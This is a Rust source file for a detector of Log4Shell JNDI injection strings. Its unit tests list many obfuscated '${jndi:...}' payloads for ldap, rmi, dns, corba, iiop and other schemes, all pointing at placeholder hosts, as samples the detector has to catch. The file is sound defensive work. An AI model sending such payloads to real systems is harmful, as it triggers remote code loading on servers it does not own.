mod matcher;
use matcher::Matcher;
pub struct Ruleset {
    rules: Vec<Vec<char>>,
}

impl Ruleset {
    pub fn new(rules: &mut std::str::Lines) -> Self {
        Self {
            rules: rules.map(|rule| rule.trim().chars().collect()).collect(),
        }
    }

    pub fn match_rules(&self, line: &str) -> bool {
        let mut matchers: Vec<Matcher> = self.rules.iter().map(|rule| Matcher::new(rule)).collect();

        for c in line.to_ascii_lowercase().chars() {
            let is_match = matchers.iter_mut().any(|matcher| {
                matcher.advance(c);
                matcher.is_match()
            });

            if is_match {
                return true;
            }
        }

        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_ldap() {
        let ruleset = Ruleset::new(&mut "${jndi:ldap://".lines());
        let lines = vec![
            "${jndi:ldap://anysite.com/z}",
            "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//anysite.com/z}",
            "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://anysite.com/z}",
            "${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://anysite.com/z}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://anysite.com/z}"
        ];

        assert!(lines.iter().all(|line| ruleset.match_rules(line)));
    }

    #[test]
    fn detects_rmi() {
        let ruleset = Ruleset::new(&mut "${jndi:rmi://".lines());
        let lines = vec![
            "${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}",
            "${jndi:rmi://adsasd.asdasd.asdasd}",
            "${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}",
            "${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}",
            "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}",
            "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}",
        ];

        assert!(lines.iter().all(|line| ruleset.match_rules(line)));
    }

    #[test]
    fn detects_ldaps() {
        let ruleset = Ruleset::new(&mut "${jndi:ldaps://".lines());
        let lines = vec![
          "${jndi:ldaps://anysite.com/z}",
          "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}daps${env:ENV_NAME:-:}//anysite.com/z}",
          "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}s://anysite.com/z}",
          "${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}s://anysite.com/z}",
          "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:${::-s}://anysite.com/z}"
        ];

        assert!(lines.iter().all(|line| ruleset.match_rules(line)));
    }

    #[test]
    fn detects_dns() {
        let ruleset = Ruleset::new(&mut "${jndi:dns://".lines());
        let lines = vec![
          "${jndi:dns://anysite.com/z}",
          "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-d}ns${env:ENV_NAME:-:}//anysite.com/z}",
          "${${lower:j}ndi:${lower:d}n${lower:s}://anysite.com/z}",
          "${${upper:j}ndi:${upper:d}n${lower:s}://anysite.com/z}",
          "${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://anysite.com/z}"
        ];

        assert!(lines.iter().all(|line| ruleset.match_rules(line)));
    }

    #[test]
    fn detects_nis() {
        let ruleset = Ruleset::new(&mut "${jndi:nis://".lines());
        let lines = vec![
          "${jndi:nis://anysite.com/z}",
          "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-n}is${env:ENV_NAME:-:}//anysite.com/z}",
          "${${lower:j}ndi:${lower:n}i${lower:S}://anysite.com/z}",
          "${${upper:j}ndi:${upper:n}I${lower:s}://anysite.com/z}",
          "${${::-j}${::-n}${::-d}${::-i}:${::-n}${::-i}${::-s}://anysite.com/z}"
        ];

        assert!(lines.iter().all(|line| ruleset.match_rules(line)));
    }

    #[test]
    fn detects_nds() {
        let ruleset = Ruleset::new(&mut "${jndi:nds://".lines());
        let lines = vec![
          "${jndi:nds://anysite.com/z}",
          "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-n}ds${env:ENV_NAME:-:}//anysite.com/z}",
          "${${lower:j}ndi:${lower:n}d${lower:S}://anysite.com/z}",
          "${${upper:j}ndi:${upper:n}D${lower:s}://anysite.com/z}",
          "${${::-j}${::-n}${::-d}${::-i}:${::-n}${::-d}${::-s}://anysite.com/z}"
        ];

        assert!(lines.iter().all(|line| ruleset.match_rules(line)));
    }

    #[test]
    fn detects_corba() {
        let ruleset = Ruleset::new(&mut "${jndi:corba://".lines());
        let lines = vec![
          "${jndi:corba://anysite.com/z}",
          "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-c}orba${env:ENV_NAME:-:}//anysite.com/z}",
          "${${lower:j}ndi:${lower:c}${lower:o}r${lower:b}a://anysite.com/z}",
          "${${upper:j}ndi:${upper:c}${upper:o}R${lower:b}a://anysite.com/z}",
          "${${::-j}${::-n}${::-d}${::-i}:${::-c}${::-o}${::-r}${::-b}:${::-a}://anysite.com/z}"
        ];

        assert!(lines.iter().all(|line| ruleset.match_rules(line)));
    }

    #[test]
    fn skips_safe_lines() {
        let ruleset = Ruleset::new(&mut "${jndi:rmi://".lines());
        let lines = vec![
            "jndi:ldap",
            "jndi:rmi",
            "${hello}",
            "://log4j_cop.com",
            "something else",
        ];

        assert_eq!(false, lines.iter().any(|line| ruleset.match_rules(line)));
    }

    #[test]
    fn detects_iiop() {
        let ruleset = Ruleset::new(&mut "${jndi:iiop://".lines());
        let lines = vec![
            "${jndi:iiop://anysite.com/z}",
            "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-i}iop${env:ENV_NAME:-:}//anysite.com/z}",
            "${${lower:j}ndi:${lower:i}${lower:i}o${lower:p}://anysite.com/z}",
            "${${upper:j}ndi:${upper:i}${upper:i}O${lower:p}://anysite.com/z}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-i}${::-i}${::-o}${::-p}://anysite.com/z}"
        ];

        assert!(lines.iter().all(|line| ruleset.match_rules(line)));
    }

    #[test]
    fn detects_mixed_case_lines() {
        let ruleset = Ruleset::new(&mut "${jndi:ldap://".lines());
        let lines = vec![
          "${jNdI:ldAp://anysite.com/z}",
          "${${env:ENV_NAME:-j}nDi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dAp${env:ENV_NAME:-:}//anysite.com/z}",
          "${${lower:j}Ndi:${lower:l}${lower:d}A${lower:p}://anysite.com/z}",
          "${${upper:j}nDi:${upper:l}${upper:d}A${lower:p}://anysite.com/z}",
          "${${::-J}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://anysite.com/z}"
        ];

        assert!(lines.iter().all(|line| ruleset.match_rules(line)));
    }
}
